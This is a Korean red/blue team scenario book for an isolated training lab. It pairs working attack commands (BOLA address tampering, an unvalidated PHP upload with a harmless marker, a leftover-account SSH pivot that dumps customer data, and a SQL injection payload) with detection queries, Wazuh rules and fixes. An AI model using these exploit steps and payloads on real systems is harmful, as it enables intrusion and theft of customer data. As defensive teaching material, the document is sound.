# LOGION CASE 공격·탐지 시나리오북 (Red/Blue)

> 교육용 격리 랩 전용 · 실제 악성코드·웹셸 금지(무해한 마커만) · 더미 데이터
> 진행 원칙: **① 룰 느슨(공격 성공) → ② 탐지 확인 → ③ 조치 → ④ 재시험(막힘)**

## 공통 준비
- **공격 지점**: 정식은 **Kali(10.10.99.10)** 에서 WAF로. (Kali 없으면 임시로 아무 dmz 호스트에서 실행 — 단 출발지 IP가 달라짐)
- **모든 공격은 WAF 경유**: `http://10.10.10.5/` (직접 10.10.10.20 치면 WAF 로그 안 남음)
- **계정**: ua/ua_pass123, ub/ub_pass123(CUSTOMER) · staff01/staff_pass123 · **partner01/partner123(STAFF·잔존)**
- **Wazuh 대시보드**: `https://192.168.56.50` (admin/1234) → Threat Hunting / Agents
- **조치 도구**: WebAPI VM의 `~/logion-webapi/security/harden.sh` (취약 엔드포인트를 fixed/ 로 교체 + partner01 비활성화)

---

## CASE 1 — 배송지 무단 변경 (BOLA)
- **취약점**: `api/update_shipping.php` 가 shipment 소유권을 검증 안 함 → `shipment_id`만 바꾸면 남의 배송지 변경
- **분류**: OWASP API1:2023 BOLA / MITRE **T1565.001**(Stored Data Manipulation)

### ① Red — 공격
```bash
# 1) 공격자 ua 로그인 (쿠키 저장)
curl -s -c /tmp/ua.txt -d "login_id=ua&password=ua_pass123" http://10.10.10.5/login.php

# 2) 본인 배송 확인 — 내 shipment_id 는 1
curl -s -b /tmp/ua.txt http://10.10.10.5/dashboard.php | grep -i shipment_id

# 3) BOLA: 남(ub, shipment_id=2)의 배송지를 변경
curl -s -i -b /tmp/ua.txt \
  --data-urlencode "shipment_id=2" \
  --data-urlencode "new_address=서울시 공격구 탈취로 666" \
  http://10.10.10.5/api/update_shipping.php
```
→ 응답이 `s=ok` 리다이렉트면 **성공**(ua가 ub 배송지를 바꿈).

### ② Blue — 탐지
- **WAF/CRS: 탐지 안 됨** — BOLA는 CRS 시그니처가 없음. **이게 핵심 교육 포인트**(WAF 탐지 공백).
- **DB 감사 테이블이 증거** (MariaDB에서):
```sql
SELECT h.shipment_id, h.actor_user_id, o.user_id AS owner_id, h.old_address, h.new_address, h.changed_at
FROM shipment_address_history h
JOIN shipments s ON s.shipment_id = h.shipment_id
JOIN orders o    ON o.order_id    = s.order_id
WHERE h.actor_user_id <> o.user_id;   -- 변경자 ≠ 배송 소유자 = 비인가
```
→ `actor_user_id=1(ua)` 가 `owner_id=2(ub)` 의 배송을 바꾼 행이 BOLA 증거. `api_audit_logs` 에도 `ADDRESS_UPDATE / SUCCESS` 기록.
- (선택) WebAPI Apache 접근로그를 Wazuh로 수집하면 `/api/update_shipping.php` POST 가 타임라인에 올라옴.

### ③ 조치
```bash
# WebAPI VM
cd ~/logion-webapi && sudo bash security/harden.sh 10.10.20.10
```
→ `fixed/update_shipping.php` 로 교체(세션 사용자 소유 shipment 인지 검증).

### ④ 재시험
②의 3번 명령 재실행 → 이번엔 **403/거부**(남의 shipment 변경 불가). DB에 비인가 변경 행 안 생김.

---

## CASE 2 — 물류문서 업로드 검증 누락
- **취약점**: `admin/upload.php` 가 확장자·MIME 검증 없이 원본 파일명으로 `/uploads/` 에 저장 → 실행 가능 파일 업로드
- **분류**: MITRE **T1505.003**(Web Shell) · WAF(ModSecurity) 방어 대상

### ① Red — 공격
```bash
# 무해한 마커 php (실제 악성코드 아님)
echo '<?php echo "LOGION-MARKER-CASE2"; ?>' > /tmp/marker.php

# partner01(STAFF) 로그인
curl -s -c /tmp/p.txt -d "login_id=partner01&password=partner123" http://10.10.10.5/login.php

# 검증 없는 업로드
curl -s -i -b /tmp/p.txt -F "doc=@/tmp/marker.php" http://10.10.10.5/admin/upload.php

# 업로드된 파일이 실행되는지 (RCE 잠재성 — 마커만 출력)
curl -s http://10.10.10.5/uploads/marker.php
```
→ 마지막이 `LOGION-MARKER-CASE2` 출력하면 **업로드+실행 성공**.

### ② Blue — 탐지
- **WAF/ModSecurity 탐지됨**: 멀티파트 본문의 `<?php` → CRS **933xxx**(PHP Injection) → Wazuh 커스텀 룰 **100304**.
- 대시보드 검색: `rule.groups: modsecurity and rule.id: 100304` (agent: waf)
- **DB 증거**: `uploaded_documents` 에 `.php` 가 `validation_status=ACCEPTED` 로 저장됨(검증 생략 흔적).
```sql
SELECT original_filename, mime_type, validation_status, uploaded_at FROM uploaded_documents ORDER BY uploaded_at DESC;
```

### ③ 조치 (2단계)
```bash
# (a) 앱 수정: 확장자/MIME 검증 + 웹루트 밖 저장
cd ~/logion-webapi && sudo bash security/harden.sh 10.10.20.10
```
```bash
# (b) WAF 차단 모드 전환 (DetectionOnly → On) — WAF VM
sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/nginx/modsec/modsecurity.conf
sudo systemctl restart nginx
```

### ④ 재시험
①의 업로드 재실행 → 앱단에서 거부(확장자) **또는** WAF가 **403으로 차단**. `/uploads/marker.php` 접근 시 404/실행 안 됨.

---

## CASE 3 — 잔존 협력업체 계정 침투 (Bastion 필요)
- **취약점**: `partner01` 이 비활성화돼야 할 협력사 계정인데 **status=ACTIVE 로 잔존** → 유효 계정으로 내부 침투
- **분류**: MITRE **T1078**(Valid Accounts) + **T1021**(Remote Services)
- **사전**: Bastion VM 켜기 → Wazuh에서 `bastion` 에이전트 Active 확인

### ① Red — 공격
```bash
# 1) 잔존 계정으로 포털 로그인 (ACTIVE 라 통과됨)
curl -s -i -c /tmp/pt.txt -d "login_id=partner01&password=partner123" http://10.10.10.5/login.php
#   → dashboard 로 리다이렉트되면 잔존 계정 유효 확인

# 2) 내부 피벗: 협력계정으로 Bastion SSH → 내부망 접근
ssh partner01@10.10.20.6        # (Bastion에 설정된 협력 OS 계정)
#   Bastion에서 내부 DB 접근 시도
mysql -h 10.10.20.10 -u logion -plogion_dev_pw logion -e "SELECT login_id,name,phone FROM users;"
```
→ 잔존 계정으로 로그인·내부 피벗·고객정보 열람까지 되면 **성공**.

### ② Blue — 탐지
- **WebAPI**: `api_audit_logs` / Apache 로그에 **비활성화됐어야 할 partner01** 활동.
- **Bastion auditd → Wazuh**(커스텀 룰 100400~100405): SSH 로그인, 실행 명령(mysql 등), 권한 변경.
  - 대시보드 검색: `rule.groups: logion_audit and agent.name: bastion`
- **Purple 포인트**: "있으면 안 되는 계정"의 정상처럼 보이는 로그인 — 계정 수명주기 관리 실패.

### ③ 조치
```bash
# 잔존 계정 비활성화 (harden.sh 가 수행) — WebAPI VM
cd ~/logion-webapi && sudo bash security/harden.sh 10.10.20.10
#   내부적으로: UPDATE users SET status='DISABLED' WHERE login_id='partner01';
```
+ Bastion에서 partner01 OS 계정/SSH 접근 제거.

### ④ 재시험
```bash
curl -s -i -d "login_id=partner01&password=partner123" http://10.10.10.5/login.php
```
→ `비활성화된 계정입니다` 로 **차단**(login.php 의 status 검사). Bastion SSH도 거부.

---

## (선택) 보너스 — 주문검색 SQL Injection
- `search.php?q=` 가 바인딩 없이 문자열 결합 → SQLi (T1190 초기 접근)
```bash
curl -s -b /tmp/ua.txt "http://10.10.10.5/search.php?q=' OR '1'='1"
```
- **탐지**: WAF CRS **942xxx** → Wazuh 룰 **100302** (`rule.groups: modsecurity`, agent: waf). 이미 검증됨.
- 조치: prepared statement, WAF On.

---

## 결과 정리 매트릭스 (보고서용)
| CASE | 공격 | WAF 탐지 | Wazuh 룰 | 1차 증거 | 조치 후 |
|---|---|---|---|---|---|
| 1 BOLA | 남 배송지 변경 | ✗(공백) | (DB 감사) | shipment_address_history 소유자 불일치 | 소유권 검증 → 차단 |
| 2 업로드 | .php 업로드·실행 | ✓ 933xxx | 100304 | uploaded_documents ACCEPTED | 검증+WAF On → 차단 |
| 3 잔존계정 | 유효계정 내부침투 | ✗ | 100400~ (auditd) | partner01 활동·Bastion 로그 | 계정 비활성화 → 차단 |
| (보너스) SQLi | ' OR '1'='1 | ✓ 942xxx | 100302 | audit.log | 바인딩+WAF On → 차단 |

> 핵심 서사(Purple): **WAF가 잡는 것(SQLi·업로드 페이로드) vs 못 잡는 것(BOLA·잔존계정)** 의 대조 → "경계 방어만으로 부족, 앱 로직·계정관리·SIEM이 함께" 를 입증.
